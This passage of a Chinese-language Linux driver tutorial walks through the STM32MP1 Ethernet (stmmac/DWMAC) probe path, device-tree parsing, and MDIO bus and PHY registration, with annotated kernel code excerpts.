+<p><img src="https://images2.imgbox.com/da/5a/xHu0gPOI_o.png" alt="STM32系列SoC网络平台驱动匹配表"></p> 
+<p>第528行，匹配表包含“st,stm32mp1-dwmac”，因此设备树和驱动匹配上，当匹配成功以后第534行的stm32_dwmac_probe函数就会执行，简单分析一下stm32_dwmac_probe函数，函数内容如下：</p> 
+<pre><code class="prism language-c">示例代码 <span class="token number">52.5</span><span class="token number">.2</span><span class="token number">.5</span> stm32_dwmac_probe 函数
+<span class="token number">360</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">stm32_dwmac_probe</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token operator">*</span>pdev<span class="token punctuation">)</span>
+<span class="token number">361</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">362</span>     <span class="token keyword">struct</span> <span class="token class-name">plat_stmmacenet_data</span> <span class="token operator">*</span>plat_dat<span class="token punctuation">;</span>
+<span class="token number">363</span>     <span class="token keyword">struct</span> <span class="token class-name">stmmac_resources</span> stmmac_res<span class="token punctuation">;</span>
+<span class="token number">364</span>     <span class="token keyword">struct</span> <span class="token class-name">stm32_dwmac</span> <span class="token operator">*</span>dwmac<span class="token punctuation">;</span>
+<span class="token number">365</span>     <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">stm32_ops</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>
+<span class="token number">366</span>     <span class="token keyword">int</span> ret<span class="token punctuation">;</span>
+<span class="token number">367</span>
+<span class="token number">368</span>     ret <span class="token operator">=</span> <span class="token function">stmmac_get_platform_resources</span><span class="token punctuation">(</span>pdev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>stmmac_res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">369</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
+<span class="token number">370</span>         <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
+<span class="token number">371</span>
+<span class="token number">372</span>     plat_dat <span class="token operator">=</span> <span class="token function">stmmac_probe_config_dt</span><span class="token punctuation">(</span>pdev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>stmmac_res<span class="token punctuation">.</span>mac<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">373</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">IS_ERR</span><span class="token punctuation">(</span>plat_dat<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token number">374</span>         <span class="token keyword">return</span> <span class="token function">PTR_ERR</span><span class="token punctuation">(</span>plat_dat<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">375</span>
+<span class="token number">376</span>     dwmac <span class="token operator">=</span> <span class="token function">devm_kzalloc</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pdev<span class="token operator">-&gt;</span>dev<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token operator">*</span>dwmac<span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">377</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dwmac<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">378</span>         ret <span class="token operator">=</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>
+<span class="token number">379</span>         <span class="token keyword">goto</span> err_remove_config_dt<span class="token punctuation">;</span>
+<span class="token number">380</span>     <span class="token punctuation">}</span>
+<span class="token number">381</span>
+<span class="token number">382</span>     data <span class="token operator">=</span> <span class="token function">of_device_get_match_data</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pdev<span class="token operator">-&gt;</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">383</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>data<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">384</span>         <span class="token function">dev_err</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pdev<span class="token operator">-&gt;</span>dev<span class="token punctuation">,</span> <span class="token string">"no of match data provided\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">385</span>         ret <span class="token operator">=</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
+<span class="token number">386</span>         <span class="token keyword">goto</span> err_remove_config_dt<span class="token punctuation">;</span>
+<span class="token number">387</span>     <span class="token punctuation">}</span>
+<span class="token number">388</span>
+<span class="token number">389</span>     dwmac<span class="token operator">-&gt;</span>ops <span class="token operator">=</span> data<span class="token punctuation">;</span>
+<span class="token number">390</span>     dwmac<span class="token operator">-&gt;</span>dev <span class="token operator">=</span> <span class="token operator">&amp;</span>pdev<span class="token operator">-&gt;</span>dev<span class="token punctuation">;</span>
+<span class="token number">391</span>
+<span class="token number">392</span>     ret <span class="token operator">=</span> <span class="token function">stm32_dwmac_parse_data</span><span class="token punctuation">(</span>dwmac<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pdev<span class="token operator">-&gt;</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">393</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">394</span>         <span class="token function">dev_err</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pdev<span class="token operator">-&gt;</span>dev<span class="token punctuation">,</span> <span class="token string">"Unable to parse OF data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">395</span>         <span class="token keyword">goto</span> err_remove_config_dt<span class="token punctuation">;</span>
+<span class="token number">396</span>     <span class="token punctuation">}</span>
+<span class="token number">397</span>
+<span class="token number">398</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>stmmac_res<span class="token punctuation">.</span>wol_irq <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>dwmac<span class="token operator">-&gt;</span>clk_eth_ck<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">399</span>     ret <span class="token operator">=</span> <span class="token function">stm32_dwmac_wake_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pdev<span class="token operator">-&gt;</span>dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>stmmac_res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">400</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
+<span class="token number">401</span>         <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
+<span class="token number">402</span>     <span class="token punctuation">}</span>
+<span class="token number">403</span>
+<span class="token number">404</span>     plat_dat<span class="token operator">-&gt;</span>bsp_priv <span class="token operator">=</span> dwmac<span class="token punctuation">;</span>
+<span class="token number">405</span>
+<span class="token number">406</span>     ret <span class="token operator">=</span> <span class="token function">stm32_dwmac_init</span><span class="token punctuation">(</span>plat_dat<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">407</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
+<span class="token number">408</span>         <span class="token keyword">goto</span> err_remove_config_dt<span class="token punctuation">;</span>
+<span class="token number">409</span>
+<span class="token number">410</span>     ret <span class="token operator">=</span> <span class="token function">stmmac_dvr_probe</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pdev<span class="token operator">-&gt;</span>dev<span class="token punctuation">,</span> plat_dat<span class="token punctuation">,</span> <span class="token operator">&amp;</span>stmmac_res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">411</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
+<span class="token number">412</span>         <span class="token keyword">goto</span> err_clk_disable<span class="token punctuation">;</span>
+<span class="token number">413</span>
+<span class="token number">414</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token number">415</span>
+<span class="token number">416</span> err_clk_disable<span class="token operator">:</span>
+<span class="token number">417</span>     <span class="token function">stm32_dwmac_clk_disable</span><span class="token punctuation">(</span>dwmac<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">418</span> err_remove_config_dt<span class="token operator">:</span>
+<span class="token number">419</span>     <span class="token function">stmmac_remove_config_dt</span><span class="token punctuation">(</span>pdev<span class="token punctuation">,</span> plat_dat<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">420</span>
+<span class="token number">421</span>     <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
+<span class="token number">422</span> <span class="token punctuation">}</span>
+</code></pre> 
+<p>第368行，使用stmmac_get_platform_resources函数获取设备树上的资源，保存到struct<br> stmmac_resources类型的结构体里。</p> 
+<p>第372行，<strong>plat_dat变量指针类型为plat_stmmacenet_data结构体，plat_dat结构体主要是保存网络设备的参数，根据plat_dat的参数将网络设备注册进内核</strong>。<strong>stmmac_probe_config_dt函数作用是根据设备树上的属性值去填充plat_dat各个成员</strong>。stmmac_probe_config_dt函数内容如下示例代码所示(有省略)：</p> 
+<pre><code class="prism language-c">示例代码 <span class="token number">52.5</span><span class="token number">.2</span><span class="token number">.6</span> stmmac_probe_config_dt 函数
+<span class="token number">395</span> <span class="token keyword">struct</span> <span class="token class-name">plat_stmmacenet_data</span> <span class="token operator">*</span>
+<span class="token number">396</span> <span class="token function">stmmac_probe_config_dt</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">platform_device</span> <span class="token operator">*</span>pdev<span class="token punctuation">,</span>
+<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>mac<span class="token punctuation">)</span>
+<span class="token number">397</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">398</span>     <span class="token keyword">struct</span> <span class="token class-name">device_node</span> <span class="token operator">*</span>np <span class="token operator">=</span> pdev<span class="token operator">-&gt;</span>dev<span class="token punctuation">.</span>of_node<span class="token punctuation">;</span>
+<span class="token number">399</span>     <span class="token keyword">struct</span> <span class="token class-name">plat_stmmacenet_data</span> <span class="token operator">*</span>plat<span class="token punctuation">;</span>
+<span class="token number">400</span>     <span class="token keyword">struct</span> <span class="token class-name">stmmac_dma_cfg</span> <span class="token operator">*</span>dma_cfg<span class="token punctuation">;</span>
+<span class="token number">401</span>     <span class="token keyword">int</span> rc<span class="token punctuation">;</span>
+<span class="token number">402</span>
+<span class="token number">403</span>     plat <span class="token operator">=</span> <span class="token function">devm_kzalloc</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pdev<span class="token operator">-&gt;</span>dev<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token operator">*</span>plat<span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">404</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>plat<span class="token punctuation">)</span>
+<span class="token number">405</span>         <span class="token keyword">return</span> <span class="token function">ERR_PTR</span><span class="token punctuation">(</span><span class="token operator">-</span>ENOMEM<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">406</span>
+<span class="token number">407</span>     <span class="token operator">*</span>mac <span class="token operator">=</span> <span class="token function">of_get_mac_address</span><span class="token punctuation">(</span>np<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">408</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">IS_ERR</span><span class="token punctuation">(</span><span class="token operator">*</span>mac<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">409</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PTR_ERR</span><span class="token punctuation">(</span><span class="token operator">*</span>mac<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span>EPROBE_DEFER<span class="token punctuation">)</span>
+<span class="token number">410</span>             <span class="token keyword">return</span> <span class="token function">ERR_CAST</span><span class="token punctuation">(</span><span class="token operator">*</span>mac<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">411</span>
+<span class="token number">412</span>         <span class="token operator">*</span>mac <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+<span class="token number">413</span>     <span class="token punctuation">}</span>
+<span class="token number">414</span>
+<span class="token number">415</span>     plat<span class="token operator">-&gt;</span>phy_interface <span class="token operator">=</span> <span class="token function">of_get_phy_mode</span><span class="token punctuation">(</span>np<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">416</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>plat<span class="token operator">-&gt;</span>phy_interface <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token number">417</span>         <span class="token keyword">return</span> <span class="token function">ERR_PTR</span><span class="token punctuation">(</span>plat<span class="token operator">-&gt;</span>phy_interface<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">425</span>     plat<span class="token operator">-&gt;</span>phy_node <span class="token operator">=</span> <span class="token function">of_parse_phandle</span><span class="token punctuation">(</span>np<span class="token punctuation">,</span> <span class="token string">"phy-handle"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">426</span>
+<span class="token number">427</span>     <span class="token comment">/* PHYLINK automatically parses the phy-handle property */</span>
+<span class="token number">428</span>     plat<span class="token operator">-&gt;</span>phylink_node <span class="token operator">=</span> np<span class="token punctuation">;</span>
+<span class="token number">429</span>
+<span class="token number">430</span>     <span class="token comment">/* Get max speed of operation from device tree */</span>
+<span class="token number">431</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">of_property_read_u32</span><span class="token punctuation">(</span>np<span class="token punctuation">,</span> <span class="token string">"max-speed"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>plat<span class="token operator">-&gt;</span>max_speed<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token number">432</span>         plat<span class="token operator">-&gt;</span>max_speed <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token number">433</span>
+<span class="token number">434</span>     plat<span class="token operator">-&gt;</span>bus_id <span class="token operator">=</span> <span class="token function">of_alias_get_id</span><span class="token punctuation">(</span>np<span class="token punctuation">,</span> <span class="token string">"ethernet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">435</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>plat<span class="token operator">-&gt;</span>bus_id <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token number">436</span>         plat<span class="token operator">-&gt;</span>bus_id <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token number">437</span>
+<span class="token number">438</span>     <span class="token comment">/* Default to phy auto-detection */</span>
+<span class="token number">439</span>     plat<span class="token operator">-&gt;</span>phy_addr <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">454</span>     rc <span class="token operator">=</span> <span class="token function">stmmac_dt_phy</span><span class="token punctuation">(</span>plat<span class="token punctuation">,</span> np<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pdev<span class="token operator">-&gt;</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">607</span>     <span class="token keyword">return</span> plat<span class="token punctuation">;</span>
+<span class="token number">608</span>
+<span class="token number">609</span> error_hw_init<span class="token operator">:</span>
+<span class="token number">610</span>     <span class="token function">clk_disable_unprepare</span><span class="token punctuation">(</span>plat<span class="token operator">-&gt;</span>pclk<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">611</span> error_pclk_get<span class="token operator">:</span>
+<span class="token number">612</span>     <span class="token function">clk_disable_unprepare</span><span class="token punctuation">(</span>plat<span class="token operator">-&gt;</span>stmmac_clk<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">613</span>
+<span class="token number">614</span>     <span class="token keyword">return</span> <span class="token function">ERR_PTR</span><span class="token punctuation">(</span><span class="token operator">-</span>EPROBE_DEFER<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">615</span> <span class="token punctuation">}</span>
+</code></pre> 
+<p><strong>stmmac_probe_config_dt函数会新建一个plat_dat 指针变量，从设备树获取数据初始化palt_dat里的成员，返回plat_dat的指针地址</strong>。</p> 
+<p>第407行，使用of_get_mac_address函数从设备树获取MAC地址，这里没有定义。</p> 
+<p>第415行，使用of_get_phy_mode函数从设备树获取接口模式，获取phy-mode属性值。这里属性值为“rgmii-id”。</p> 
+<p>第425行，使用of_parse_phandle函数从设备树获取PHY句柄。</p> 
+<p>第431行，使用of_property_read_u32函数从设备树获取max-speed属性值。这里属性值为“1000”，表示网络为1000M网络。</p> 
+<p>第434行，获取网络的别名。</p> 
+<p>第439行，设置plat结构体里的phy_addr成员phy_addr设置为“-1”，phy_addr表示PHY的地址。设置为-1表示自动检测，一个MDIO接口最多可以连接32个PHY芯片，设置为-1就是自动遍历所有的PHY地址，看看哪个地址上有PHY芯片，然后将对应的PHY地址重新赋值给phy_addr。</p> 
+<p>第454行，使用stmmac_dt_phy函数去获取“mdio”节点中的信息。</p> 
+<p>继续返回示例代码52.5.2.4中的进行解释。</p> 
+<p>第376行，给dwmac结构体开空间。</p> 
+<p>第382行，获取of_device_id里的data成员值，获取ST官方自定义的stm32_ops操作集。</p> 
+<p>第389行，把获取的stm32_ops地址，赋值到stm32_dwmac结构体里的ops成员，初始化网络的时候，可以调用ops就能操作到网络相关的寄存器。</p> 
+<p>第392行，使用stm32_dwmac_parse_data函数主要是负责从设备树里获取时钟和基地址。</p> 
+<p>第405行，调用stm32_dwmac_init函数进行，初始化网络设备，函数的原型如下示例代码所示：</p> 
+<p><img src="https://images2.imgbox.com/e1/2d/WyYOqHDZ_o.png" alt="stm32_dwmac_init函数"></p> 
+<p>第121行，调用stm32_ops结构体里的set_mode函数进行寄存器的初始化。</p> 
+<p>第126行，使能时钟。</p> 
+<p>继续返回示例代码52.5.2.5中stm32_dwmac_probe函数。</p> 
+<p>stm32_dwmac_probe函数第410行，调用stmmac_dvr_probe函数进行网络注册，同时完成GMII/RGMII接口初始化。</p> 
+<p><strong>stmmac_dvr_probe函数调用netif_napi_add函数来设置poll函数</strong>，如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/f4/1e/mr866Qm4_o.png" alt="设置poll函数"></p> 
+<p>从上图可以知道，<strong>通过netif_napi_add函数向网卡加了一个napi示例，使用NAPI驱动要提供一个poll函数来轮询处理接收数据</strong>，发送和接收的poll函数分别为：“stmmac_napi_poll_tx”和“stmmac_napi_poll_rx”。后面分析网络数据接收处理流程的时候详细讲解这个两个函数。</p> 
+<p>继续分析stmmac_dvr_probe函数，此函数会调用stmmac_mdio_register函数来向内核注册MDIO总线，stmmac_mdio_register函数重点是下图中的两行代码：</p> 
+<p><img src="https://images2.imgbox.com/d0/55/8s2bzS0R_o.png" alt="mdio读写函数"></p> 
+<p>new_bus下的read和write这两个成员变量分别是读/写PHY寄存器的操作函数，<strong>这设置为stmmac_mdio_read和stmmac_mdio_write，这两个函数就是STM32MP1系列SoC读写PHY内部寄存器的函数</strong>。读写PHY寄存器都会<strong>通过这两个MDIO总线函数完成</strong>。stmmac_mdio_register函数最终会向Linux内核注册MDIO总线，相关代码如下所示：</p> 
+<p><img src="https://images2.imgbox.com/7f/ae/U6eynkxu_o.png" alt="stmmac_mdio_register函数注册mdio总线"></p> 
+<p>第1行，通过of_mdiobus_register向内核注册MDIO总线，如果设备树定义了mdio节点和PHY句柄还会注册PHY设备。</p> 
+<p>第7行，判断PHY设备是否注册成功，没有就遍历所有的PHY地址找到对应的PHY设备。</p> 
+<p>第10-28行，如果设备树里没有mdio节点和PHY句柄，通过遍历所有的PHY地址，找到硬件所对应的PHY设备。</p> 
+<p>最后stmmac_dvr_probe函数调用register_netdev函数进行网络设备注册。如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/e4/11/kklSiEmy_o.png" alt="register_netdev函数"></p> 
+<h4><a id="MDIO_1131"></a>MDIO总线注册</h4> 
+<p><strong>MDIO讲了很多次了，就是用来管理PHY芯片的，分为MDIO和MDC两根线</strong>，Linux内核专门为MDIO准备一个总线，叫做<strong>MDIO总线，采用mii_bus结构体表示</strong>，定义在include/linux/phy.h文件中，mii_bus结构体如下所示(限于篇幅，有省略)：</p> 
+<p><img src="https://images2.imgbox.com/cc/4f/N09LJZ5j_o.png" alt="mii_bus结构体"></p> 
+<p><strong>重点是第217、218两行的read和write函数，这两个函数就是读/写PHY芯片的操作函数，不同的SoC其MDIO主控部分是不一样的，因此需要驱动编写人员去编写</strong>。前面在分析stm32_dwmac_probe函数的时候已经讲过了，<strong>stm32_dwmac_probe函数会调用stmmac_mdio_register函数完成MII接口的初始化，其中就包括初始化mii_bus下的read和write这两个函数。最终通过of_mdiobus_register或者mdiobus_register函数将初始化以后的mii_bus注册到Linux内核</strong>，of_mdiobus_register函数其实也是调用的mdiobus_register函数来完成mii_bus注册的。先看下of_mdiobus_register函数，如下示例代码所示：</p> 
+<pre><code class="prism language-c">示例代码 <span class="token number">52.5</span><span class="token number">.2</span><span class="token number">.10</span> of_mdiobus_register 函数
+<span class="token number">199</span> <span class="token keyword">int</span> <span class="token function">of_mdiobus_register</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">mii_bus</span> <span class="token operator">*</span>mdio<span class="token punctuation">,</span>
+<span class="token keyword">struct</span> <span class="token class-name">device_node</span> <span class="token operator">*</span>np<span class="token punctuation">)</span>
+<span class="token number">200</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">201</span>     <span class="token keyword">struct</span> <span class="token class-name">device_node</span> <span class="token operator">*</span>child<span class="token punctuation">;</span>
+<span class="token number">202</span>     bool scanphys <span class="token operator">=</span> false<span class="token punctuation">;</span>
+<span class="token number">203</span>     <span class="token keyword">int</span> addr<span class="token punctuation">,</span> rc<span class="token punctuation">;</span>
+<span class="token number">204</span>
+<span class="token number">205</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>np<span class="token punctuation">)</span>
+<span class="token number">206</span>         <span class="token keyword">return</span> <span class="token function">mdiobus_register</span><span class="token punctuation">(</span>mdio<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">207</span>
+<span class="token number">208</span>     <span class="token comment">/* Do not continue if the node is disabled */</span>
+<span class="token number">209</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">of_device_is_available</span><span class="token punctuation">(</span>np<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token number">210</span>         <span class="token keyword">return</span> <span class="token operator">-</span>ENODEV<span class="token punctuation">;</span>
+<span class="token number">211</span>
+<span class="token number">212</span>     <span class="token comment">/* Mask out all PHYs from auto probing. Instead the PHYs listed 
+213      * in the device tree are populated after the bus has been 
+registered */</span>
+<span class="token number">214</span>     mdio<span class="token operator">-&gt;</span>phy_mask <span class="token operator">=</span> <span class="token operator">~</span><span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token number">215</span>
+<span class="token number">216</span>     mdio<span class="token operator">-&gt;</span>dev<span class="token punctuation">.</span>of_node <span class="token operator">=</span> np<span class="token punctuation">;</span>
+<span class="token number">217</span>     mdio<span class="token operator">-&gt;</span>dev<span class="token punctuation">.</span>fwnode <span class="token operator">=</span> <span class="token function">of_fwnode_handle</span><span class="token punctuation">(</span>np<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">218</span>
+<span class="token number">219</span>     <span class="token comment">/* Get bus level PHY reset GPIO details */</span>
+<span class="token number">220</span>     mdio<span class="token operator">-&gt;</span>reset_delay_us <span class="token operator">=</span> DEFAULT_GPIO_RESET_DELAY<span class="token punctuation">;</span>
+<span class="token number">221</span>     <span class="token function">of_property_read_u32</span><span class="token punctuation">(</span>np<span class="token punctuation">,</span> <span class="token string">"reset-delay-us"</span><span class="token punctuation">,</span>
+<span class="token operator">&amp;</span>mdio<span class="token operator">-&gt;</span>reset_delay_us<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">222</span>
+<span class="token number">223</span>     <span class="token comment">/* Register the MDIO bus */</span>
+<span class="token number">224</span>     rc <span class="token operator">=</span> <span class="token function">mdiobus_register</span><span class="token punctuation">(</span>mdio<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">225</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>rc<span class="token punctuation">)</span>
+<span class="token number">226</span>         <span class="token keyword">return</span> rc<span class="token punctuation">;</span>
+<span class="token number">227</span>
+<span class="token number">228</span>     <span class="token comment">/* Loop over the child nodes and register a phy_device for each 
+phy      */</span>
+<span class="token number">229</span>     <span class="token function">for_each_available_child_of_node</span><span class="token punctuation">(</span>np<span class="token punctuation">,</span> child<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">230</span>         addr <span class="token operator">=</span> <span class="token function">of_mdio_parse_addr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mdio<span class="token operator">-&gt;</span>dev<span class="token punctuation">,</span> child<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">231</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>addr <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">232</span>             scanphys <span class="token operator">=</span> true<span class="token punctuation">;</span>
+<span class="token number">233</span>             <span class="token keyword">continue</span><span class="token punctuation">;</span>
+<span class="token number">234</span>         <span class="token punctuation">}</span>
+<span class="token number">235</span>
+<span class="token number">236</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">of_mdiobus_child_is_phy</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token number">237</span>             rc <span class="token operator">=</span> <span class="token function">of_mdiobus_register_phy</span><span class="token punctuation">(</span>mdio<span class="token punctuation">,</span> child<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">238</span>         <span class="token keyword">else</span>
+<span class="token number">239</span>             rc <span class="token operator">=</span> <span class="token function">of_mdiobus_register_device</span><span class="token punctuation">(</span>mdio<span class="token punctuation">,</span> child<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">240</span>
+<span class="token number">241</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token operator">-</span>ENODEV<span class="token punctuation">)</span>
+<span class="token number">242</span>             <span class="token function">dev_err</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mdio<span class="token operator">-&gt;</span>dev<span class="token punctuation">,</span>
+<span class="token number">243</span>                 <span class="token string">"MDIO device at address %d is missing.\n"</span><span class="token punctuation">,</span>
+<span class="token number">244</span>                 addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">245</span>         <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>rc<span class="token punctuation">)</span>
+<span class="token number">246</span>             <span class="token keyword">goto</span> unregister<span class="token punctuation">;</span>
+<span class="token number">247</span>     <span class="token punctuation">}</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">281</span> <span class="token punctuation">}</span>
+</code></pre> 
+<p><strong>of_mdiobus_register函数主要是注册mii总线(mii_bus)，然后遍历所有的PHY地址，当找到对应的PHY芯片以后就会创建PHY设备，最后将这个PHY设备注册到内核中</strong>。使用mdiobus_scan函数进行注册PHY设备。</p> 
+<p>第206行，设备节点不存在的时候此行代码执行，本实验设备节点肯定存在，所以之类不会运行。</p> 
+<p>第224行，当设备树中mdio节点存在，就会将相关属性信息赋值给mdio参数，然后调用mdiobus_register向内核注册此mii总线。</p> 
+<p>第229行，轮询mdio节点下的所有phy子节点，比如示例代码52.5.1.2中的“phy0:ethernet-phy@0”这个子节点，它描述的是PHY芯片信息。</p> 
+<p>第237行，如果找到一个PHY子节点，就说明找到了一个PHY芯片，那么就调用of_mdiobus_register_phy函数向内核注册此PHY设备。</p> 
+<p>接下来简单<strong>分析一下of_mdiobus_register_phy函数，看看如何向Linux内核注册PHY设备的</strong>，of_mdiobus_register_phy函数内容如下所示：</p> 
+<pre><code class="prism language-c">示例代码 <span class="token number">52.5</span><span class="token number">.2</span><span class="token number">.11</span> of_mdiobus_register_phy 函数
+<span class="token number">1</span>  <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">of_mdiobus_register_phy</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">mii_bus</span> <span class="token operator">*</span>mdio<span class="token punctuation">,</span>
+<span class="token number">2</span>                      <span class="token keyword">struct</span> <span class="token class-name">device_node</span> <span class="token operator">*</span>child<span class="token punctuation">,</span> u32 addr<span class="token punctuation">)</span>
